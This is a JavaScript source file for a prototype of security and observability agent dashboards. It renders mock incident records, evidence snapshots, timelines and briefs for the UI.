      'day-auto2':{ id:'day-auto2', mode:'dayshift', type:'case', title:'VPN brute-force from botnet IPs — blocked at the edge', recordId:'CASE-2044', digest:'blocked a VPN brute-force at the edge',
                status:'auto-resolved', severity:'Medium', owner:'daybreak', assignees:[], mentions:[], agentInitiated:true, autoResolved:true, stub:true, updated:'04:47',
                messages:[{role:'agent',prose:'Dark Watch caught a password spray against the VPN gateway from 14 botnet-listed IPs, verified that no login succeeded, and blocked the range at the perimeter — the deny rule auto-expires in 24h.'}],
                evidence:[
                  {id:'ev-spray',t:'Password spray — 2,340 failures across 76 accounts',src:'Discover · VPN auth logs',mv:'event.outcome',icon:'db',why:'Low-and-slow pattern: 1–2 attempts per account per source IP, staying under lockout thresholds',snap:'2,340 failed logins · 76 accounts\n03:58–04:41 UTC · 14 source IPs',live:'blocked — attempts stopped 04:44',liveGood:true},
                  {id:'ev-intel',t:'All 14 source IPs on a known botnet blocklist',src:'Threat intel · abuse feeds',mv:'source.ip',icon:'shield',why:'Every source IP matches the Socks5Systemz botnet feed, last seen under 24h ago',snap:'14/14 IPs matched · confidence high',live:'feed match current',liveGood:true},
                  {id:'ev-nosucc',t:'Zero successful authentications from the range',src:'Discover · VPN auth logs',mv:'event.outcome',icon:'check',why:'No account completed auth — no MFA prompt was ever reached',snap:'success count: 0\nMFA challenges issued: 0',live:'still zero',liveGood:true},
                  {id:'ev-lockout',t:'No user lockouts triggered',src:'Entities · identity',mv:'user.locked',icon:'user',why:'Spray stayed under lockout thresholds — no user impact to unwind',snap:'lockouts: 0 · helpdesk tickets: 0',live:'0 lockouts',liveGood:true},
                ],
                timeline:[
                  {time:'03:58',txt:'First failed VPN logins from the 185.220.x.x range'},
                  {time:'04:41',txt:'Spray confirmed — 2,340 failures, 76 accounts, 14 IPs, all on a botnet feed'},
                  {time:'04:44',cls:'ok',txt:'<b>Range blocked at the perimeter</b> — deny rule auto-expires in 24h'},
                  {time:'04:47',cls:'ok',txt:'CASE-2044 opened and resolved autonomously — 0 successful logins'},
                ],
                actions:[
                  {kind:'isolate',title:'Blocked 14 IPs at the VPN gateway',sub:'Perimeter deny rule scoped to the botnet range — auto-expires in 24h',status:'done',time:'04:44',by:'daybreak',reversible:true},
                  {kind:'incident',title:'Opened + closed CASE-2044',sub:'Case created with evidence attached, then resolved autonomously',status:'done',time:'04:47',by:'daybreak'},
                ],
                questions:['Keep the perimeter block past its 24h auto-expiry?','Should the 76 sprayed accounts get a precautionary MFA re-enroll nudge?'],
                assessment:'Blocked autonomously — the spray never produced a successful login, and the deny rule expires on its own in 24h.', assessmentTone:'ok',
                callout:{tone:'ok',icon:'check',text:'Resolved by Dark Watch under its allow-list. Reversible — the deny rule auto-expires in 24h and is one click to lift.'},
                narrative:'A low-and-slow password spray against the VPN gateway (2,340 failures across 76 accounts from 14 botnet-listed IPs) was blocked at the perimeter autonomously. No login succeeded and no accounts locked; the deny rule auto-expires in 24h.' },
      'day-r7':{ id:'day-r7', mode:'dayshift', type:'case', title:'Data staging detected — FIN-DB-02', recordId:'CASE-2050',
                status:'awaiting', severity:'High', owner:'you', assignees:[], mentions:[], stub:true, updated:'20m ago',
                messages:[{role:'agent',prose:'A 4.2 GB archive was assembled in C:\\temp on FIN-DB-02 from finance DB exports. Nothing has left the host yet — staged, not exfiltrated.'}],
                evidence:[], timeline:[], actions:[], narrative:'4.2 GB archive staged in temp on FIN-DB-02 from finance DB exports. No egress observed yet.' },
      'day-r8':{ id:'day-r8', mode:'dayshift', type:'case', title:'Credential-harvest page live — phishing wave', recordId:'CASE-2049',
                status:'open', severity:'High', owner:'you', assignees:[], mentions:[], stub:true, updated:'32m ago',
                messages:[{role:'agent',prose:'A live credential-harvest page branded as the Okta login is being clicked by 18 users — the latest page in this week&rsquo;s wave. No credentials confirmed submitted on this page yet.'}],
                evidence:[], timeline:[], actions:[], narrative:'Active phishing wave; 18 users clicking the latest Okta look-alike page. Earlier pages in the wave captured session tokens. No confirmed submissions on this page yet.' },
      'day-m1':{ id:'day-m1', mode:'dayshift', type:'investigation', title:'Host isolation running — FIN-WS-22', recordId:'INV-2052',
                status:'in-progress', severity:'High', owner:'you', assignees:[], mentions:[], stub:true, updated:'now',
                messages:[{role:'agent',prose:'Isolating FIN-WS-22 — the workstation that drove the Sales-NAS encryption. You kicked off containment at shift start; policy propagating (step 3 of 4). ETA under a minute.'}],
                evidence:[], timeline:[], actions:[], narrative:'Network containment of FIN-WS-22 (the Sales-NAS encryption source) in progress; isolation policy propagating.' },
      'day-m2':{ id:'day-m2', mode:'dayshift', type:'case', title:'Session revocation sweep — j.reyes blast radius', recordId:'CASE-2053',
                status:'in-progress', severity:'High', owner:'you', assignees:[], mentions:[], stub:true, updated:'now',
                messages:[{role:'agent',prose:'Revoking sessions across the j.reyes blast radius — the precaution from CASE-2043 — 2 of 5 downstream apps done.'}],
                evidence:[], timeline:[], actions:[], narrative:'Revoking active sessions across apps downstream of j.reyes@corp — the precaution flagged in CASE-2043.' },
      'day-w1':{ id:'day-w1', mode:'dayshift', type:'hunt', title:'Low-confidence beaconing — single host', recordId:'HUNT-2048',
                status:'open', severity:'Low', owner:'priya', assignees:[], mentions:[], stub:true, updated:'1h ago',
                messages:[{role:'agent',prose:'Low-confidence beaconing from one host to 91.242.x.x — periodicity is weak and volume is tiny. Watching for a second hit before acting.'}],
                evidence:[], timeline:[], actions:[], narrative:'Weak beaconing candidate to 91.242.x.x from a single host; monitoring.' },
      'day-w2':{ id:'day-w2', mode:'dayshift', type:'case', title:'Off-hours VPN logins — 3 contractors', recordId:'CASE-2046',
                status:'open', severity:'Low', owner:'tom', assignees:[], mentions:[], stub:true, updated:'2h ago',
                messages:[{role:'agent',prose:'Three contractors signed in via VPN outside their usual hours. All MFA-clean and from known devices — flagging, not escalating.'}],
                evidence:[], timeline:[], actions:[], narrative:'Off-hours VPN sign-ins by 3 contractors; MFA-clean, known devices. Flagged for awareness.' },
      'day-w3':{ id:'day-w3', mode:'dayshift', type:'case', title:'Unverified OAuth app pending review', recordId:'CASE-2045',
                status:'open', severity:'Low', owner:'you', assignees:[], mentions:[], stub:true, updated:'3h ago',
                messages:[{role:'agent',prose:'A new OAuth app ("SheetSync") requested read-only scopes and is pending publisher verification. No grants yet — unrelated to CASE-2039.'}],
                evidence:[], timeline:[], actions:[], narrative:'New OAuth app (SheetSync) requesting read-only scopes, pending publisher verification. No grants issued.' },
      // NIGHTSHIFT — pre-staged inverse scenario
      'night-1':{ id:'night-1', mode:'nightshift', type:'investigation', title:'Checkout latency regression — p99 +340ms', recordId:'INV-NS-77',
                status:'awaiting', severity:'High', owner:'nightshift', forUser:'you', assignees:[], mentions:[], agentInitiated:true,
                messages:[], suggestions:[], staged:'night', evidence:[], timeline:[], actions:[], narrative:'' },
      'night-amb1':{ id:'night-amb1', mode:'nightshift', type:'investigation', title:'Memory leak — ingest-worker pods', recordId:'INV-NS-71',
                status:'resolved', severity:'Medium', owner:'nightshift', assignees:['you'], stub:true,
                messages:[{role:'agent',prose:'Heap growth on ingest-worker traced to an unbounded cache added in v4.2. NightShift proposed a TTL fix, you approved it at 03:40 — heap stable since.'}],
                evidence:[], timeline:[], actions:[], narrative:'Unbounded in-memory cache in ingest-worker v4.2 caused steady heap growth toward OOM. Remediated via TTL cap. Resolved.' },
      'night-r1':{ id:'night-r1', mode:'nightshift', type:'investigation', title:'Error-rate spike — payments-api', recordId:'INV-NS-74',
                status:'in-progress', severity:'High', owner:'nightshift', assignees:['you'], mentions:[], agentInitiated:true, stub:true, updated:'40m ago',
                messages:[{role:'agent',agent:'nightshift',prose:'5xx rate on payments-api climbed to 4% after a config push at 01:48. I correlated the change and am validating a proposed revert.'}],
                evidence:[], timeline:[], actions:[], narrative:'payments-api 5xx error rate rose to 4% following a config change. NightShift correlated the push and is validating a proposed revert, awaiting human review.' },
      'night-r2':{ id:'night-r2', mode:'nightshift', type:'investigation', title:'Disk saturation — kafka-broker-3', recordId:'INV-NS-69',
                status:'resolved', severity:'Medium', owner:'nightshift', assignees:[], mentions:[], agentInitiated:true, stub:true, updated:'6h ago',
                messages:[{role:'agent',agent:'nightshift',prose:'Disk on kafka-broker-3 reached 92%. I expired stale log segments and expanded the volume. Stable since.'}],
                evidence:[], timeline:[], actions:[], narrative:'kafka-broker-3 disk usage reached 92%. NightShift expired stale log segments and expanded the volume. Resolved.' },
      'night-r3':{ id:'night-r3', mode:'nightshift', type:'incident', title:'Region failover — eu-west-1', recordId:'INC-NS-12',
                status:'resolved', severity:'Critical', owner:'maya', assignees:['you'], mentions:[], stub:true, updated:'3d ago', commander:'maya',
                messages:[{role:'system',evt:'incident',text:'Incident resolved',id:'INC-NS-12'}],
                evidence:[], timeline:[], actions:[], narrative:'eu-west-1 availability degraded; traffic failed over to eu-central-1 with no customer impact. Root cause: upstream provider outage. Closed.' },
      'night-r4':{ id:'night-r4', mode:'nightshift', type:'investigation', title:'Error budget exhausted — search-api SLO', recordId:'INV-NS-78',
                status:'awaiting', severity:'High', owner:'nightshift', assignees:['you'], mentions:[], agentInitiated:true, stub:true, updated:'12m ago',
                messages:[{role:'agent',agent:'nightshift',prose:'The 30-day error budget for search-api is 96% spent — at the current 4× burn it exhausts within the hour.'}],
                evidence:[], timeline:[], actions:[], narrative:'search-api 30-day error budget 96% spent at a 4× burn rate; exhausts within the hour.' },
      'night-r5':{ id:'night-r5', mode:'nightshift', type:'investigation', title:'Cascading timeouts — cart → inventory', recordId:'INV-NS-79',
                status:'open', severity:'High', owner:'nightshift', assignees:[], mentions:[], agentInitiated:true, stub:true, updated:'18m ago',
                messages:[{role:'agent',agent:'nightshift',prose:'Timeouts in cart are cascading into inventory — retry storms are amplifying load. Three services degraded.'}],
                evidence:[], timeline:[], actions:[], narrative:'cart timeouts cascading into inventory via retry amplification; 3 services degraded.' },
      'night-r6':{ id:'night-r6', mode:'nightshift', type:'investigation', title:'TLS cert expires in 5h — payments gateway', recordId:'INV-NS-80',
                status:'awaiting', severity:'High', owner:'nightshift', assignees:['you'], mentions:[], agentInitiated:true, stub:true, updated:'25m ago',
                messages:[{role:'agent',agent:'nightshift',prose:'The TLS cert on the payments gateway expires in 5 hours. Auto-renew failed twice on an ACME challenge error.'}],
                evidence:[], timeline:[], actions:[], narrative:'payments gateway TLS cert expires in ~5h; ACME auto-renew failed twice (HTTP-01 challenge blocked).' },
      'night-r7':{ id:'night-r7', mode:'nightshift', type:'investigation', title:'OOMKill loop — recommendation-svc', recordId:'INV-NS-81',
                status:'open', severity:'High', owner:'nightshift', assignees:[], mentions:[], agentInitiated:true, stub:true, updated:'30m ago',
                messages:[{role:'agent',agent:'nightshift',prose:'recommendation-svc pods are in an OOMKill loop — 6 restarts in 10 minutes. The memory limit looks too low for the new model.'}],
                evidence:[], timeline:[], actions:[], narrative:'recommendation-svc OOMKill loop, 6 restarts in 10 min; memory limit too low after the new model build.' },
      'night-m1':{ id:'night-m1', mode:'nightshift', type:'investigation', title:'Autoscaling up — checkout pods', recordId:'INV-NS-82',
                status:'in-progress', severity:'Medium', owner:'nightshift', assignees:[], mentions:[], agentInitiated:true, stub:true, updated:'now',
                messages:[{role:'agent',agent:'nightshift',prose:'Scaling checkout pods 6 → 14 to absorb the load. 11 ready, 3 pending.'}],
                evidence:[], timeline:[], actions:[], narrative:'Horizontal scale-out of checkout pods (6 → 14) to absorb load.' },
      'night-m2':{ id:'night-m2', mode:'nightshift', type:'investigation', title:'Consumer drain + restart — kafka lag', recordId:'INV-NS-83',
                status:'in-progress', severity:'Medium', owner:'nightshift', assignees:[], mentions:[], agentInitiated:true, stub:true, updated:'now',
                messages:[{role:'agent',agent:'nightshift',prose:'Draining and restarting the lagging kafka consumer group — lag down from 2.1M to 480k.'}],
                evidence:[], timeline:[], actions:[], narrative:'Draining and restarting a lagging kafka consumer group; lag recovering.' },
      'night-w1':{ id:'night-w1', mode:'nightshift', type:'investigation', title:'Elevated GC pauses — ingest-worker', recordId:'INV-NS-84',
                status:'open', severity:'Low', owner:'nightshift', assignees:[], mentions:[], agentInitiated:true, stub:true, updated:'1h ago',
                messages:[{role:'agent',agent:'nightshift',prose:'Elevated GC pauses on ingest-worker (p99 220ms) — within tolerance but trending up. Watching the heap.'}],
                evidence:[], timeline:[], actions:[], narrative:'ingest-worker GC pauses elevated (p99 220ms), within tolerance and trending up. Monitoring.' },
      'night-w2':{ id:'night-w2', mode:'nightshift', type:'investigation', title:'Logs volume at 71% — eu-central-1', recordId:'INV-NS-85',
                status:'open', severity:'Low', owner:'nightshift', assignees:[], mentions:[], agentInitiated:true, stub:true, updated:'2h ago',
                messages:[{role:'agent',agent:'nightshift',prose:'Logs volume in eu-central-1 is at 71% and climbing slowly. Days of headroom — flagging early.'}],
                evidence:[], timeline:[], actions:[], narrative:'eu-central-1 logs volume at 71%, slow climb. Days of headroom. Flagged early.' },
      'night-w3':{ id:'night-w3', mode:'nightshift', type:'investigation', title:'Flaky healthcheck — eu-west replica', recordId:'INV-NS-86',
                status:'open', severity:'Low', owner:'nightshift', assignees:[], mentions:[], agentInitiated:true, stub:true, updated:'90m ago',
                messages:[{role:'agent',agent:'nightshift',prose:'The eu-west read replica fails its healthcheck intermittently (3 in an hour). No query impact yet.'}],
                evidence:[], timeline:[], actions:[], narrative:'eu-west read replica intermittent healthcheck failures (3/hour); no query impact yet.' },
    }
  };
}

/* ---- Evidence + timeline content for the NotDaybreak case ---- */
const DAY_EVIDENCE = [
  {id:'ev-authburst',t:'Authentication failure burst', src:'Discover · auth-* (saved query)', snap:'247 failed logons → 1 success\nhost: FIN-WS-04 · 02:18–02:41 UTC', live:'0 in last 1h', why:'Brute-force pattern immediately preceding the successful compromise.', icon:'db', mv:'event.outcome:failure'},
  {id:'ev-interactive',t:'Anomalous interactive logon', src:'Alert · 7f3a-... (Service account logon)', snap:'svc-backup · type 10 (interactive)\nFIN-WS-04 · 02:41:07 UTC', live:'flagged', why:'svc-backup is non-interactive by policy — first interactive logon in 90 days.', icon:'alert', mv:'rule: unusual_svc_logon'},
  {id:'ev-powershell',t:'Encoded PowerShell execution', src:'Endpoint · process events (FIN-WS-04)', snap:'powershell.exe -enc <b64…>\nparent: services.exe → download cradle', live:'process ended', why:'Obfuscated execution decoding to a remote payload fetch.', icon:'terminal', mv:'T1059.001'},
  {id:'ev-c2',t:'C2 beacon', src:'Network · flows (FIN-WS-04)', snap:'FIN-WS-04 → 45.137.x.x:443 (update-sync[.]net)\n14 conns / 6 min · no prior history', live:'still active', liveGood:false, why:'Regular-interval outbound to a rare external host — classic C2 cadence.', icon:'network', mv:'dst.ip:45.137.x.x'},
  {id:'ev-smb',t:'Lateral movement attempt', src:'Endpoint · FIN-DC-01', snap:'SMB (445) FIN-WS-04 → FIN-DC-01\n02:44 UTC · auth FAILED', live:'no retry since', why:'Attempted pivot to the domain controller. Failed — but intent is unambiguous.', icon:'host', mv:'T1021.002'},
  {id:'ev-account',t:'Account context', src:'Asset inventory · svc-backup', snap:'expected hosts: BKP-* · last rotation: 412d\nowner: Backup Automation', live:'stale', why:'Stale credential on an out-of-scope host — consistent with credential theft.', icon:'asset', mv:'identity: svc-backup'},
];
const DAY_TIMELINE = [
  {time:'02:18',cls:'crit',txt:'<b>Failed-logon burst begins</b> on FIN-WS-04 (247 over 23 min)'},
  {time:'02:41',cls:'crit',txt:'<b>Successful interactive logon</b> as svc-backup'},
  {time:'02:41',cls:'',txt:'Encoded <b>PowerShell</b> spawned (download cradle)'},
  {time:'02:42',cls:'',txt:'<b>Outbound C2</b> to 45.137.x.x:443 established'},
  {time:'02:44',cls:'crit',txt:'<b>SMB lateral movement</b> attempt to FIN-DC-01 (failed)'},
];
const DAY_MITRE = ['T1110.001','T1078.002','T1059.001','T1071.001','T1021.002'];
const DAY_NARRATIVE = `A brute-force burst against <b>FIN-WS-04</b> culminated in a successful interactive logon using the dormant service account <b>svc-backup</b> at 02:41 UTC. The session immediately executed an obfuscated PowerShell download cradle, established outbound <b>C2</b> to a rare external host, and attempted <b>SMB lateral movement</b> to the domain controller FIN-DC-01 (failed). Assessment: <b>active credential compromise</b> with attempted privilege expansion.`;

/* ---- NightShift content ---- */
const NIGHT_EVIDENCE = [
  {id:'ev-slo',t:'SLO burn alert', src:'SLOs · checkout-service availability', snap:'p99 latency 180ms → 520ms in 12 min\nSLO threshold: 300ms · breached 02:14 UTC', live:'still breaching', liveGood:false, why:'Customer-facing latency SLO breach on the checkout path.', icon:'gauge', mv:'slo: checkout_p99'},
  {id:'ev-trace',t:'Trace span breakdown', src:'APM · traces (checkout-service)', snap:'+340ms localized to db.query span GetCart\nwas 22ms → now 360ms', live:'confirmed', why:'Regression isolated to a single database query span.', icon:'trace', mv:'span: GetCart'},
  {id:'ev-deploy',t:'Deploy event', src:'Deploys · checkout-service', snap:'checkout@v2.8.1 deployed 02:02 UTC\n12 min before regression onset', live:'current', why:'Deploy timing tightly correlates with the latency onset.', icon:'deploy', mv:'release: v2.8.1'},
  {id:'ev-diff',t:'Query diff (root cause)', src:'Repo · checkout @ v2.8.1', snap:'GetCart: index hint removed\n→ full table scan on carts (1.2M rows)', live:'in prod', why:'Code change that introduced the unindexed query — the root cause.', icon:'code', mv:'commit: a91f2c'},
];
const NIGHT_TIMELINE = [
  {time:'02:02',cls:'',txt:'<b>Deploy</b> checkout@v2.8.1 to production'},
  {time:'02:14',cls:'crit',txt:'<b>SLO breach</b> detected — NightShift opens this investigation'},
  {time:'02:21',cls:'',txt:'Latency localized to <b>GetCart</b> query span'},
  {time:'02:26',cls:'act',txt:'<b>Root cause identified</b> — removed index hint in v2.8.1'},
];
const NIGHT_NARRATIVE = `At 02:14 UTC, NightShift detected the <b>checkout-service</b> p99 latency SLO burning (180ms → 520ms). Autonomous diagnosis localized the regression to the <b>GetCart</b> database query, which a <b>v2.8.1</b> deploy at 02:02 had degraded by removing an index hint (now full-scanning 1.2M rows). Root cause confirmed. <b>Proposed remediation: roll back to v2.8.0.</b> Awaiting your review.`;

/* ============================================================ RENDER HELPERS */
const $=s=>document.querySelector(s);
function el(html){const t=document.createElement('template');t.innerHTML=html.trim();return t.content.firstChild;}
function avatar(pid,cls=''){const p=PEOPLE[pid];if(p.photo)return `<span class="avatar ${cls}" title="${p.name}" style="background-image:url('${p.photo}');background-size:cover;background-position:center;color:transparent"></span>`;return `<span class="avatar ${cls}" style="background:${p.color}">${p.init}</span>`;}
function curThread(){return state.threads[state.activeId];}

function highlightQuery(q){
  return q.replace(/"([^"]+)"/g,'<span class="str">"$1"</span>')
          .replace(/\b(AND|OR|NOT|in|window|over)\b/g,'<span class="kw">$1</span>');
}

/* ============================================================ NAVIGATOR */
function renderNav(){
  const scroll=$('#navScroll');
  const mode=state.mode;
  const navTop=document.getElementById('navTop');
  if(navTop){ navTop.innerHTML = leftPanelHeader({title:mode==='nightshift'?'NightShift':'NotDaybreak', newTitle:'New chat', onNew:'App.newChat()', collapse:true}); }
  const all=Object.values(state.threads).filter(t=>t.mode===mode);
  const pinned=all.filter(t=>t.pinned);
  const STATUS_RANK={'in-progress':0,'open':1,'awaiting':2,'contained':3,'auto-resolved':4,'resolved':5,'closed':6};
  const active=all.filter(t=>t.type!=='chat' && !t.pinned)
    .sort((a,b)=>(STATUS_RANK[a.status]??9)-(STATUS_RANK[b.status]??9));
  const chats=all.filter(t=>t.type==='chat' && !t.pinned);
  const view=state.navView||'chats';
  const briefName='Brief';
  // When a record/thread row is the active selection, the row carries the
  // highlight — don't also light up the "All chats" menu item.
  const activeRowShown = view==='chats' && all.some(t=>t.id===state.activeId);
  let html='';
  const inChats = (view==='chats' || view==='projects' || view==='templates');
  if(inChats){
    // Chats section: Projects & Templates entries, then the conversation lists
    html+=`<div class="nav-menu">`;
    html+=navMenuItem('projects', 'folder', 'Projects', view==='projects');
    html+=navMenuItem('templates', 'doc', 'Templates', view==='templates');
    html+=`</div><div class="nav-divide"></div>`;
    html+=`<div class="nav-search nav-search-block"><span class="nsi">${ic('search',14)}</span><input placeholder="Search threads &amp; records"></div>`;
    // pinned
    if(pinned.length){ html+=`<div class="nav-group"><div class="nav-group-h">${ic('pin',13)} Pinned</div>`; pinned.forEach(t=>{ html+=navItem(t,t.type==='chat'); }); html+=`</div>`; }
    // active records
    html+=`<div class="nav-group"><div class="nav-group-h">${ic('layers',14)} Active records <span class="cnt">${active.length}</span></div>`;
    active.forEach(t=>{ html+=navItem(t); });
    html+=`</div>`;
    // recent threads
    html+=`<div class="nav-group"><div class="nav-group-h">${ic('sparkle',14)} Recent threads <span class="hint">ephemeral</span></div>`;
    chats.forEach(t=>{ html+=navItem(t,true); });
    html+=`</div>`;
  }
  scroll.innerHTML=html;
}
function leftPanelHeader(o){
  o=o||{};
  const collapse = o.collapse ? `<button class="nav-collapse" title="Collapse sidebar" onclick="${o.onCollapse||'App.toggleSecondary()'}">${ic('sidebar',16)}</button>` : '';
  const plus = o.onNew ? `<button class="nav-new icon-only" title="${o.newTitle||'New'}" onclick="${o.onNew}">${ic('plus',16)}</button>` : '';
  return `<div class="nav-top"><div class="nav-row1"><span class="nav-brand">${o.title||''}</span>${plus}${collapse}</div></div>`;
}
function navMenuItem(key,icon,label,on){
  return `<div class="nav-menu-item ${on?'on':''}" onclick="App.setNavView('${key}')"><span class="nmi-ic">${ic(icon,16)}</span> ${label}</div>`;
}
function sidebarToggleBtn(){ return `<button class="sidebar-toggle" title="Show conversations" onclick="App.toggleSecondary()">${ic('sidebar',16)}</button>`; }
/* Record-panel actions run their workflow in the event's conversation: jump to (or open) that chat first. */
function chatToRecord(){
  const t=curThread(); if(!t || t.type==='chat') return;
  App.openThread(t.id);   // chat + record panel side by side, conversation focused
}
function syncChatDock(){
  const dock=document.getElementById('chatDock'); if(!dock) return;
  const rp=document.querySelector('.brief-mode .radar-page'); if(!rp) return;
  const host=dock.offsetParent||dock.parentElement; if(!host) return;
  const hr=host.getBoundingClientRect(), rr=rp.getBoundingClientRect();
  const cs=getComputedStyle(rp);
  const padL=parseFloat(cs.paddingLeft)||0, padR=parseFloat(cs.paddingRight)||0;
  const bleed=18; // extend the dock a touch past the cards on each side
  const left=(rr.left-hr.left)+padL-bleed;
  const width=rr.width-padL-padR+bleed*2;
  dock.style.left=left+'px';
  dock.style.right='auto';
  dock.style.width=width+'px';
  // Collapsed "Ask" pill centers on the dock, which spans the card row —
  // pill, panel, and cards share the same axis.
  const badge=dock.querySelector('.chat-badge');
  if(badge) badge.style.left='';
}
// Keep the pill glued to the heading through any layout change (panel/flyout
// open+close, sidebar toggle, resize) — not just at render time, so it never
// lags behind and snaps into place a frame later.
let _dockRO=null;
function observeDock(){
  try{ if(!_dockRO) _dockRO=new ResizeObserver(()=>{ try{ syncChatDock(); }catch(e){} }); }catch(e){ return; }
  try{ _dockRO.disconnect(); }catch(e){}
  [document.querySelector('.thread'), document.querySelector('#homeSpecial'), document.querySelector('.brief-scroll')]
    .forEach(t=>{ if(t) try{ _dockRO.observe(t); }catch(e){} });
}
function renderHomeMain(){
  const view=state.navView||'chats';
  const thread=document.querySelector('.thread'); if(!thread) return;
  const showSec=!(state.nav&&state.nav.showSecondary===false);
  const insp=document.getElementById('inspector');
  let sp=document.getElementById('homeSpecial');
  if(view==='chats'){ thread.classList.remove('special'); if(sp) sp.remove(); if(insp) renderInspector(); return; }
  thread.classList.add('special');
  if(insp){
    if(state.inspectorOpen && (state.panelFlyout || state.navView==='brief')){ renderInspector(); }
    else { insp.classList.add('collapsed'); insp.classList.remove('maximized','as-flyout'); insp.style.width=''; insp.style.left=''; insp.innerHTML=''; const bd=document.getElementById('inspBackdrop'); if(bd) bd.remove(); }
  }
  if(!sp){ sp=el(`<div id="homeSpecial" class="home-special"></div>`); thread.appendChild(sp); }
  const expand = showSec?'':`<div class="special-top">${sidebarToggleBtn()}</div>`;
  if(view==='brief'){
    const prevSc=document.querySelector('.brief-scroll'); const keepTop=prevSc?prevSc.scrollTop:0;
    sp.classList.add('brief-mode');
    sp.innerHTML = `<div class="brief-scroll">${expand}${briefView()}</div>${briefComposer()}`;
    const newSc=sp.querySelector('.brief-scroll'); if(newSc && keepTop){ void newSc.offsetHeight; newSc.scrollTop=keepTop; }
    syncChatDock();                       // position the pill before this frame paints (no post-render jump)
    requestAnimationFrame(syncChatDock);  // and re-settle once fonts/layout are final
    observeDock();                        // track heading through later layout shifts (panel open/close)
  } else {
    sp.classList.remove('brief-mode');
    sp.innerHTML = expand + (view==='projects'?projectsView():templatesView());
  }
}
const BRIEF = {
  dayshift:{
    icon:'sun', sub:'security · agent',
    headline:'You have active threats that need triage',
    state:[
      {kind:'Identity', name:'cfo@corp', icon:'user'},
      {kind:'Service', name:'okta-sso', icon:'shield'},
      {kind:'Endpoint', name:'FIN-WS-04', icon:'host'},
      {kind:'Mailbox', name:'exchange', icon:'doc'},
    ],
    risk:{critical:1, high:6, medium:1, low:4},
    featured:{ score:94, threadId:'day-r3',
      title:'Impossible travel on cfo@corp with satisfied MFA — likely session-token theft',
      chips:['cfo@corp','okta-sso'] },
    prose:'I can open a case and start response on the highest-risk items now — reads run automatically, and anything that changes state asks first. To see everything, jump to the security overview.',
    primary:{label:'Triage all', icon:'sparkle'},
    hubLabel:'Alerts', hubDest:'alerts', secondLabel:'Topology view',
    composer:'Ask NotDaybreak, or give it a task — e.g. “open a case on the cfo impossible-travel”',
    pickup:`On it. The highest-risk item is the <b>impossible-travel on cfo@corp</b> — MFA was satisfied from two countries inside 40 minutes, which points to <b>session-token theft</b> rather than a guessed password. <b>CASE-2047</b> is already open with the evidence attached — want me to revoke the active sessions, or dig into the token lineage first?`,
  },
  nightshift:{
    icon:'moon', sub:'observability · agent',
    headline:'You have significant events that require escalation',
    state:[
      {kind:'Service', name:'checkout', icon:'layers'},
      {kind:'Service', name:'payments-api', icon:'layers'},
      {kind:'Infrastructure', name:'kafka', icon:'layers'},
      {kind:'Service', name:'ingest-worker', icon:'layers'},
    ],
    risk:{critical:0, high:6, medium:2, low:3},
    featured:{ score:95, threadId:'night-1',
      title:'Checkout p99 regression root-caused to the v2.8.1 deploy — rollback proposed, awaiting your review',
      chips:['checkout','payments-api'] },
    prose:'You can start remediation with the agent now and get these fixed — drafts and rollbacks ask before they run. To see everything, go to the Significant events hub.',
    primary:{label:'Remediate all', icon:'sparkle'},
    hubLabel:'Significant events', hubDest:'dashboards', secondLabel:'Topology view',
    composer:'Welcome to NightShift — ask a question or give a task',
    pickup:`On it. The highest-risk item is the <b>checkout p99 regression</b> — I've root-caused it to the <b>v2.8.1</b> deploy (a removed query index hint) and staged a rollback to v2.8.0. Want me to execute the rollback, or open the full investigation first?`,
  },
};
function sevClass(s){ return ({Critical:'crit',High:'high',Medium:'med',Low:'low'})[s]||'low'; }
function briefEvents(mode,tab){
  const recs=Object.values(state.threads).filter(t=>t.mode===mode && t.type!=='chat');
  if(tab==='progress') return recs.filter(t=>t.status==='in-progress');
  if(tab==='archived') return recs.filter(t=>['resolved','closed'].includes(t.status));
  return recs.filter(t=>['open','awaiting'].includes(t.status));
}
function scoreRing(score){
  const r=26,c=2*Math.PI*r,off=c*(1-score/100);
  return `<svg width="76" height="76" viewBox="0 0 76 76"><circle cx="38" cy="38" r="${r}" fill="none" stroke="var(--line-2)" stroke-width="7"/><circle cx="38" cy="38" r="${r}" fill="none" stroke="var(--red)" stroke-width="7" stroke-linecap="round" stroke-dasharray="${c.toFixed(1)}" stroke-dashoffset="${off.toFixed(1)}" transform="rotate(-90 38 38)"/><text x="38" y="44" text-anchor="middle" font-size="19" font-weight="700" fill="var(--red-d)" font-family="var(--mono)">${score}</text></svg>`;
}
function featuredHTML(mode){
  const f=BRIEF[mode].featured;
  return `<div class="bf-feat" onclick="App.openThread('${f.threadId}')">
    <div class="bf-ring">${scoreRing(f.score)}</div>
    <div class="bf-feat-b">
      <div class="bf-feat-t">${f.title}</div>
      <div class="bf-feat-chips">${f.chips.map(c=>`<span class="bf-chip">${ic('layers',11)} ${c}</span>`).join('')}<span class="bf-chip esc">${ic('arrow',11)} Escalate</span></div>
    </div>
  </div>`;
}
function briefRows(evs){
  if(!evs.length) return `<div class="bf-empty">Nothing in this view.</div>`;
  return evs.map(t=>`<div class="bf-row" onclick="App.openThread('${t.id}')">
    <span class="bf-row-ic">${ic('maximize',13)}</span>
    <span class="bf-row-t">${t.title}</span>
    <span class="sev ${sevClass(t.severity)}">${t.severity||'—'}</span>
    <span class="bf-row-a" title="Attachments">${ic('clip',14)}</span>
    <span class="bf-row-a agent" title="${state.mode==='nightshift'?'NightShift':'NotDaybreak'} is on this">${ic(state.mode==='nightshift'?'moon':'sun',14)}</span>
    <span class="bf-row-a" onclick="event.stopPropagation();App.toast('info','Row actions','Per-event actions are stubbed in this prototype.')">${ic('dots',14)}</span>
  </div>`).join('');
}
function briefPanelHTML(){
  const mode=state.mode||'dayshift'; const B=BRIEF[mode]; const tab=state.briefTab||'active';
  return `
    <div class="bf-risk">
      <div class="bf-rt crit"><div class="bf-rt-k">Critical risk</div><div class="bf-rt-v">${ic('target',15)} ${B.risk.critical}</div></div>
      <div class="bf-rt high"><div class="bf-rt-k">High risk</div><div class="bf-rt-v">${ic('warn',15)} ${B.risk.high}</div></div>
      <div class="bf-rt"><div class="bf-rt-k">Medium</div><div class="bf-rt-v">${B.risk.medium}</div></div>
      <div class="bf-rt"><div class="bf-rt-k">Low</div><div class="bf-rt-v">${B.risk.low}</div></div>
    </div>
    ${tab==='active'?featuredHTML(mode):''}
    <div class="bf-list" id="briefList">${briefRows(briefEvents(mode,tab))}</div>`;
}
function agentAvatarBig(mode){ return `<span class="bf-bot ${mode==='nightshift'?'night':'day'}">${ic(mode==='nightshift'?'moon':'sun',26)}</span>`; }
const AI_RADAR = {
